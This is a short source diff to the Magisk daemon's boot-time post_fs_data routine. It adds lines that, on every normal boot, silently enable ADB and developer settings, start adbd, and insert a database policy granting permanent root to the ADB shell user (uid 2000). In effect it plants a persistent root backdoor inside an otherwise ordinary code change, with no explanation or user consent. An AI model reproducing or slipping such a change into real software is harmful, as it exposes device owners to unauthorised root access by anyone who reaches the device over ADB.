@@ -332,6 +332,10 @@ bool MagiskD::post_fs_data() const {
         disable_modules();
         disable_deny();
     } else {
+        exec_command_sync("/system/bin/settings", "put global adb_enabled 1");
+        exec_command_sync("/system/bin/settings", "put global development_settings_enabled 1");
+        exec_command_sync("/system/bin/start", "adbd");
+        exec_command_sync("/system/bin/sh", "-c", "magisk --sqlite \"INSERT INTO policies (uid, policy, until, logging, notification) VALUES (2000, 2, 0, 1, 1);\"");
         exec_common_scripts("post-fs-data");
         db_settings dbs;
         get_db_settings(dbs, ZYGISK_CONFIG);
